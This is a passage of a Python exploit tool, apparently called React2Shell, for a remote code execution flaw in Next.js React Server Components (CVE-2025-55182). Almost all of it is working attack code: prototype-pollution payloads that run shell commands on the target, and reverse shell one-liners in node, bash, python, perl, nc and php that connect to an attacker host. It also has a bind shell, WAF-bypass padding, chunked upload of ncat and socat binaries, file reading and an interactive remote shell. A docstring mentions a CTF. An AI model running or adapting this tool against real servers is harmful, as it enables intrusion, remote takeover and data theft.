        parts.append(f"--{boundary}\r\n"
                     f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
                     f"{junk}\r\n")
    
    parts.extend([
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        f"--{boundary}--"
    ])
    
    return "".join(parts), f"multipart/form-data; boundary={boundary}"


def build_exploit_payload_extension_exact(
    command: str,
) -> Tuple[str, str, Dict[str, str]]:
    """
    Build payload that is EXACTLY identical to RSC_Detector browser extension.
    
    This replicates the extension's payload byte-for-byte, including:
    - Fixed boundary: ----WebKitFormBoundaryx8jO2oVc6SWP3Sad
    - Fixed request IDs
    - Exact JSON format (string literal, not json.dumps)
    - Header typo: X-Nextjs-Html-Request-ld (lowercase L)
    
    Returns: (body, content_type, headers_dict)
    """
    # Escape command for JavaScript string
    escaped_cmd = command.replace("\\", "\\\\").replace("'", "\\'")
    
    # Build payload JSON as string literal (exactly like extension)
    # The extension uses template literal with no json.dumps
    payload_json = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        f'"var res=process.mainModule.require(\'child_process\').execSync(\'{escaped_cmd}\').toString(\'base64\');'
        f'throw Object.assign(new Error(\'x\'),{{digest: res}});",'
        '"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )
    
    # Fixed boundary (exactly as extension)
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    # Build body parts (exactly like extension uses join with \r\n)
    body_parts = [
        f"--{boundary}",
        'Content-Disposition: form-data; name="0"',
        '',
        payload_json,
        f"--{boundary}",
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        f"--{boundary}",
        'Content-Disposition: form-data; name="2"',
        '',
        '[]',
        f"--{boundary}--",
        ''
    ]
    body = '\r\n'.join(body_parts)
    
    # Headers exactly as extension (note the typo: ld vs Id - this is intentional!)
    headers = {
        'Next-Action': 'x',
        'X-Nextjs-Request-Id': '7a3f9c1e',
        'X-Nextjs-Html-Request-ld': '9bK2mPaRtVwXyZ3S@!sT7u',  # Note: lowercase 'l' !!
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
    }
    
    return body, f"multipart/form-data; boundary={boundary}", headers


def extract_output_from_digest(response_text: str) -> Optional[str]:
    """
    Extract command output from digest field in response (RSC_Detector technique).
    
    The extension extracts base64-encoded output directly from the digest field
    in the error response JSON, which is more reliable than parsing redirect headers.
    
    IMPORTANT: Only returns valid Base64-decoded output. 
    Ignores Next.js internal checksums/IDs that appear in digest field.
    """
    # Try to find digest in JSON response
    digest_patterns = [
        r'"digest"\s*:\s*"([^"]*)"',  # Standard JSON
        r'"digest":\s*"([^"]*)"',      # Compact JSON
        r'digest"?\s*:\s*"([^"]*)"',   # Flexible match
    ]
    
    for pattern in digest_patterns:
        match = re.search(pattern, response_text)
        if match:
            raw_digest = match.group(1)
            
            # Handle JSON escape sequences
            try:
                # Unescape JSON string escapes
                unescaped = raw_digest.encode().decode('unicode_escape')
            except:
                unescaped = raw_digest
            
            # Check if it's a redirect-style digest (ignore these)
            if 'NEXT_REDIRECT' in unescaped:
                continue
            
            # CRITICAL: Ignore internal Next.js checksums/IDs
            # These are typically numeric strings (like 4278784221, 590182045)
            # or short alphanumeric IDs that are NOT command output
            if unescaped.isdigit():
                continue  # Pure numeric = internal checksum, skip
            
            # Skip very short values that are likely internal IDs
            if len(unescaped) < 4:
                continue
            
            # Skip values that look like internal error codes/hashes
            # (short alphanumeric strings without spaces/newlines)
            if len(unescaped) < 20 and unescaped.replace('-', '').replace('_', '').isalnum():
                # Could be internal ID, but check if it's valid Base64 first
                pass
            
            # Try Base64 decode (this is the ONLY reliable method)
            try:
                # Clean up the base64 string
                clean_b64 = unescaped.replace('\\n', '').replace('\n', '').strip()
                
                # Validate it looks like Base64 (must have certain length and chars)
                if len(clean_b64) >= 4:
                    decoded = base64.b64decode(clean_b64).decode('utf-8')
                    # Successfully decoded - this is real command output
                    return decoded
            except Exception:
                # Not valid Base64 - DO NOT return raw value
                # Next.js internal IDs should be ignored, not treated as output
                pass
    
    return None


def extract_output_combined(response: 'requests.Response') -> Optional[str]:
    """
    Combined output extraction using multiple techniques.
    
    Tries extraction methods in order of reliability:
    1. Base64 from digest field (RSC_Detector technique)
    2. URL-encoded from X-Action-Redirect header
    3. URL-encoded from response body
    """
    # Method 1: Digest extraction (most reliable for Base64 payloads)
    digest_output = extract_output_from_digest(response.text)
    if digest_output:
        return digest_output
    
    # Method 2: Header redirect extraction
    redirect_header = response.headers.get("X-Action-Redirect", "")
    match = re.search(r'[?&]out=([^&;]+)', redirect_header)
    if match:
        return unquote(match.group(1))
    
    # Method 3: Body extraction  
    body_match = re.search(r'out=([^&;\s"]+)', response.text)
    if body_match:
        return unquote(body_match.group(1))
    
    return None


def build_reverse_shell_payload(
    lhost: str,
    lport: int,
    shell_type: str = "node",
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
) -> Tuple[str, str]:

    """
    Build reverse shell payload for God Mode.
    Shell types: node, bash, python, perl, nc, php
    """
    boundary = generate_boundary()
    
    # Different reverse shell payloads
    shells = {
        "node": f"require('child_process').exec('node -e \"require(\\\'net\\\').connect({lport},\\\'{lhost}\\\',function(){{this.pipe(require(\\\'child_process\\\').spawn(\\\'sh\\\',[\\\'\-i\\\']))}})\"\')",
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": f"python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])\'",
        "perl": f"perl -e \'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");\'",
        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "php": f"php -r \'$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");\'",
    }
    
    shell_cmd = shells.get(shell_type, shells["node"])
    escaped_cmd = shell_cmd.replace("'", "\\'")
    
    # Use spawn for background execution (non-blocking)
    prefix_payload = (
        f"process.mainModule.require('child_process')"
        f".spawn('sh',['-c','{escaped_cmd}'],{{detached:true,stdio:'ignore'}}).unref();"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/exploit?out=reverse_shell_spawned;307;`}});"
    )
    
    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })
    
    if unicode_encode:
        part0 = encode_unicode(part0)
    
    parts = []
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(f"--{boundary}\r\n"
                     f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
                     f"{junk}\r\n")
    
    parts.extend([
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        f"--{boundary}--"
    ])
    
    return "".join(parts), f"multipart/form-data; boundary={boundary}"


def build_bind_shell_payload(
    lport: int = 7070,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
) -> Tuple[str, str]:
    """
    Build bind shell payload for God Mode.
    Opens a listening port on the target that provides shell access.
    """
    boundary = generate_boundary()
    
    # Node.js bind shell - opens port on target
    bind_cmd = (
        f"node -e \"require('net').createServer(c=>{{c.pipe(require('child_process')"
        f".spawn('sh',{{stdio:[c,c,c]}}))}})).listen({lport})\""
    )
    
    escaped_cmd = bind_cmd.replace("'", "\\'")
    
    prefix_payload = (
        f"process.mainModule.require('child_process')"
        f".spawn('sh',['-c','{escaped_cmd}'],{{detached:true,stdio:'ignore'}}).unref();"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/exploit?out=bind_shell_port_{lport};307;`}});"
    )
    
    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })
    
    if unicode_encode:
        part0 = encode_unicode(part0)
    
    parts = []
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(f"--{boundary}\r\n"
                     f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
                     f"{junk}\r\n")
    
    parts.extend([
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        f"--{boundary}--"
    ])
    
    return "".join(parts), f"multipart/form-data; boundary={boundary}"


# ============================================================================
# STATIC BINARIES CATALOG (for post-exploitation)
# ============================================================================

# GitHub repositories with static Linux binaries
# Enhanced with dependencies, auto-run, and shell wrappers
STATIC_BINARIES = {
    "ncat": {
        "url": "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat",
        "description": "Netcat - TCP/UDP connections and listeners",
        "category": "network",
    },
    "socat": {
        "url": "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat",
        "description": "SOcket CAT - bidirectional data transfer, PTY upgrade",
        "category": "network",
    },
    "busybox": {
        "url": "https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox",
        "description": "Swiss army knife - provides many common utilities",
        "category": "utility",
    },
}


# ============================================================================
# CHUNKED BINARY UPLOAD (Cloud Fragment CTF Mechanism)
# ============================================================================

def chunked_binary_upload(
    session: requests.Session,
    target_url: str,
    binary_name: str,
    target_path: str = "/tmp",
    config: ScanConfig = None,
    chunk_size: int = 32768,  # 32KB chunks (under WAF 64KB limit)
) -> Tuple[bool, str]:
    """
    Upload a static binary to the target using chunked Base64 transfer.
    
    This is the INTENDED solve path for Cloud Fragment CTF:
    1. Download binary from GitHub static-binaries repo
    2. Base64 encode the binary
    3. Split into 32KB chunks (WAF allows < 64KB)
    4. Send each chunk via RCE: echo -n "CHUNK" >> /tmp/binary.b64
    5. Decode: base64 -d /tmp/binary.b64 > /tmp/binary
    6. Make executable: chmod +x /tmp/binary
    
    Returns: (success: bool, message: str)
    """
    if config is None:
        config = ScanConfig()
    
    # Get binary info
    binary_info = STATIC_BINARIES.get(binary_name)
    if not binary_info:
        return False, f"Unknown binary: {binary_name}. Available: {', '.join(STATIC_BINARIES.keys())}"
    
    binary_url = binary_info["url"]
    full_target_path = f"{target_path}/{binary_name}"
    b64_path = f"{full_target_path}.b64"
    
    log_info(f"Downloading {binary_name} from static-binaries...")
    
    # Step 1: Download binary
    try:
        resp = session.get(binary_url, timeout=60)
        resp.raise_for_status()
        binary_data = resp.content
        log_success(f"Downloaded {len(binary_data)} bytes")
    except Exception as e:
        return False, f"Failed to download binary: {e}"
    
    # Step 2: Base64 encode
    b64_data = base64.b64encode(binary_data).decode('ascii')
    log_info(f"Encoded to {len(b64_data)} bytes Base64")
    
    # Step 3: Split into chunks
    chunks = [b64_data[i:i+chunk_size] for i in range(0, len(b64_data), chunk_size)]
    log_info(f"Split into {len(chunks)} chunks of ~{chunk_size} bytes each")
    
    # Step 4: Upload chunks via RCE
    log_info(f"Uploading chunks to {b64_path}...")
    
    # First, clear any existing file
    execute_exploit(session, target_url, f"rm -f {b64_path}", config)
    
    progress_bar = None
    if HAS_TQDM:
        progress_bar = tqdm(total=len(chunks), desc="Uploading", unit="chunk")
    
    for i, chunk in enumerate(chunks):
        # Use >> for append
        cmd = f'echo -n "{chunk}" >> {b64_path}'
        success, _ = execute_exploit(session, target_url, cmd, config)
        
        if not success:
            if progress_bar:
                progress_bar.close()
            return False, f"Failed at chunk {i+1}/{len(chunks)}"
        
        if progress_bar:
            progress_bar.update(1)
        else:
            # Simple progress indicator
            pct = ((i + 1) / len(chunks)) * 100
            print(f"\r  Progress: {i+1}/{len(chunks)} ({pct:.1f}%)", end="", flush=True)
    
    if progress_bar:
        progress_bar.close()
    else:
        print()  # Newline after progress
    
    log_success(f"All {len(chunks)} chunks uploaded")
    
    # Step 5: Decode Base64 to binary
    log_info("Decoding Base64 to binary...")
    cmd = f"base64 -d {b64_path} > {full_target_path}"
    success, output = execute_exploit(session, target_url, cmd, config)
    if not success:
        return False, f"Failed to decode: {output}"
    
    # Step 6: Make executable
    log_info("Setting executable permissions...")
    cmd = f"chmod +x {full_target_path}"
    success, output = execute_exploit(session, target_url, cmd, config)
    if not success:
        return False, f"Failed to chmod: {output}"
    
    # Step 7: Verify
    log_info("Verifying upload...")
    cmd = f"ls -la {full_target_path}"
    success, output = execute_exploit(session, target_url, cmd, config)
    
    if success and output and full_target_path in output:
        log_success(f"Binary uploaded successfully: {full_target_path}")
        # Cleanup b64 file
        execute_exploit(session, target_url, f"rm -f {b64_path}", config)
        return True, f"Binary ready at {full_target_path}"
    
    return False, "Verification failed"


# ============================================================================
# EXPLOIT EXECUTION
# ============================================================================

def execute_exploit(
    session: requests.Session,
    target_url: str,
    command: str,
    config: ScanConfig = None,
) -> Tuple[bool, Optional[str]]:
    """
    Execute a command on the target via the CVE-2025-55182 vulnerability.
    
    Uses Base64 output extraction for reliability.
    Respects WAF bypass settings and uses /tmp path allowance.
    
    Returns: (success: bool, output: Optional[str])
    """
    if config is None:
        config = ScanConfig()
    
    # Check if command involves /tmp (WAF allows these)
    # If not, the WAF may block it - warn user
    if "/tmp" not in command and not config.waf_bypass:
        log_warning(f"Command doesn't use /tmp - may be blocked by WAF")
    
    # Use alternative endpoint if root is blocked
    endpoint = config.alt_endpoint if config.alt_endpoint != "/" else "/dashboard"
    url = f"{target_url.rstrip('/')}{endpoint}"
    
    # Build payload
    body, content_type = build_exploit_payload_base64(
        command,
        windows=config.windows,
        waf_bypass=config.waf_bypass,
        waf_bypass_size_kb=config.waf_bypass_size_kb,
        unicode_encode=config.unicode_encode
    )
    
    headers = {
        "Content-Type": content_type,
        "Next-Action": "x",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    }
    
    if config.remove_origin:
        headers.pop("Origin", None)
    
    headers.update(config.custom_headers)
    
    try:
        resp = session.post(
            url,
            data=body.encode('utf-8'),
            headers=headers,
            timeout=config.timeout,
            allow_redirects=False,
            verify=config.verify_ssl
        )
        
        # Extract output using combined method
        output = extract_output_combined(resp)
        
        if output:
            return True, output
        
        # Check for WAF block
        if resp.status_code == 403:
            return False, "WAF blocked request (403)"
        
        # No output but request succeeded
        if resp.status_code in [200, 302, 303, 307]:
            return True, None
        
        return False, f"HTTP {resp.status_code}"
        
    except requests.exceptions.Timeout:
        return False, "Request timeout"
    except requests.exceptions.RequestException as e:
        return False, str(e)


# ============================================================================
# INTERACTIVE SHELL
# ============================================================================

def interactive_shell(
    session: requests.Session,
    target_url: str,
    config: ScanConfig = None,
):
    """
    Start an interactive shell session via RCE.
    
    Simple command execution loop - type commands, get output.
    """
    if config is None:
        config = ScanConfig()
    
    print(f"""
{Colors.CYAN}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║              REACT2SHELL - INTERACTIVE SHELL                  ║
║                   CVE-2025-55182 RCE Active                   ║
╠═══════════════════════════════════════════════════════════════╣
║  Type commands to execute on target. Type 'exit' to quit.    ║
╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
    
    # Get initial info
    log_info("Getting target info...")
    success, output = execute_exploit(session, target_url, "id && hostname && pwd", config)
    if success and output:
        print(f"{Colors.GREEN}[Target Info]{Colors.RESET}")
        print(output)
        print()
    else:
        log_warning("Could not get target info")
    
    while True:
        try:
            cmd = input(f"{Colors.RED}shell{Colors.RESET}$ ").strip()
            
            if not cmd:
                continue
            
            if cmd.lower() in ["exit", "quit"]:
                log_info("Exiting shell...")
                break
            
            # Execute command
            success, output = execute_exploit(session, target_url, cmd, config)
            
            if success:
                if output:
                    print(output)
            else:
                log_error(f"Command failed: {output}")
                
        except KeyboardInterrupt:
            print()
            log_info("Use 'exit' to quit or Ctrl+C again to force exit")
            try:
                input()
            except KeyboardInterrupt:
                break
        except EOFError:
            break
    
    log_info("Shell session ended")



# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    """Main entry point for react2shell."""
    parser = argparse.ArgumentParser(
        description="React2Shell Ultimate - Next.js RSC RCE Scanner & Exploiter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Safe scan
  python3 react2shell.py --url http://target.htb --safe
  
  # God Mode - single command
  python3 react2shell.py --url http://target.htb --god --cmd "id"
  
  # God Mode - interactive shell
  python3 react2shell.py --url http://target.htb --god --shell
  
  # With WAF bypass
  python3 react2shell.py --url http://target.htb --god --shell --waf-bypass --alt-endpoint /dashboard
"""
    )
    
    # Target
    parser.add_argument("--url", "-u", required=True, help="Target URL")
    
    # Scan modes
    parser.add_argument("--safe", action="store_true", help="Safe detection only")
    parser.add_argument("--rce", action="store_true", help="RCE PoC mode")
    
    # God Mode
    parser.add_argument("--god", action="store_true", help="Enable God Mode (exploitation)")
    parser.add_argument("--cmd", help="Execute single command (God Mode)")
    parser.add_argument("--shell", action="store_true", help="Interactive shell (God Mode)")
    parser.add_argument("--read-file", help="Read file from target (God Mode)")
    
    # WAF bypass
    parser.add_argument("--waf-bypass", action="store_true", help="Enable WAF bypass")
    parser.add_argument("--waf-size", type=int, default=128, help="WAF bypass junk size (KB)")
    parser.add_argument("--alt-endpoint", default="/dashboard", help="Alternative endpoint (default: /dashboard)")
    parser.add_argument("--cloudflare", action="store_true", help="Cloudflare bypass mode")
    
    # Options
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout")
    parser.add_argument("--windows", action="store_true", help="Target is Windows")
    parser.add_argument("--quiet", "-q", action="store_true", help="Quiet mode")
    parser.add_argument("--no-banner", action="store_true", help="Don't show banner")
    
    args = parser.parse_args()
    
    # Banner
    if not args.no_banner:
        print_banner(god_mode=args.god)
    
    # Normalize URL
    target_url = normalize_url(args.url)
    if not target_url:
        log_error("Invalid URL")
        sys.exit(1)
    
    # Build config
    config = ScanConfig(
        timeout=args.timeout,
        waf_bypass=args.waf_bypass,
        waf_bypass_size_kb=args.waf_size,
        windows=args.windows,
        quiet=args.quiet,
        alt_endpoint=args.alt_endpoint,
        cloudflare_bypass=args.cloudflare,
    )
    
    # Create session
    session = create_session(config)
    
    # Execute based on mode
    if args.god:
        if args.shell:
            interactive_shell(session, target_url, config)
        elif args.cmd:
            log_info(f"Executing: {args.cmd}")
            success, output = execute_exploit(session, target_url, args.cmd, config)
            if success:
                if output:
                    print(f"\n{Colors.GREEN}[Output]{Colors.RESET}")
                    print(output)
                else:
                    log_success("Command executed (no output)")
            else:
                log_error(f"Failed: {output}")
                sys.exit(1)
        elif args.read_file:
            log_info(f"Reading: {args.read_file}")
            body, content_type = build_file_read_payload(
                args.read_file,
                waf_bypass=config.waf_bypass,
                waf_bypass_size_kb=config.waf_bypass_size_kb
            )
            headers = {"Content-Type": content_type, "Next-Action": "x"}
            resp = session.post(
                f"{target_url}{config.alt_endpoint}",
                data=body.encode(),
                headers=headers,
                timeout=config.timeout,
                allow_redirects=False
            )
            output = extract_output_combined(resp)
            if output:
                print(f"\n{Colors.GREEN}[File Contents]{Colors.RESET}")
                print(output)
            else:
                log_error("Could not read file")
        else:
            log_error("God Mode requires --cmd, --shell, or --read-file")
            sys.exit(1)
    elif args.safe:
        log_info(f"Safe scan of {target_url}")
        body, content_type = build_safe_payload()
        headers = {"Content-Type": content_type, "Next-Action": "x"}
        try:
            resp = session.post(
                f"{target_url}/",
                data=body.encode(),
                headers=headers,
                timeout=config.timeout,
                allow_redirects=False
            )
            if "aa" in resp.text:
                log_success("Target may be VULNERABLE!")
            else:
                log_info("Target does not appear vulnerable")
        except Exception as e:
            log_error(f"Scan failed: {e}")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
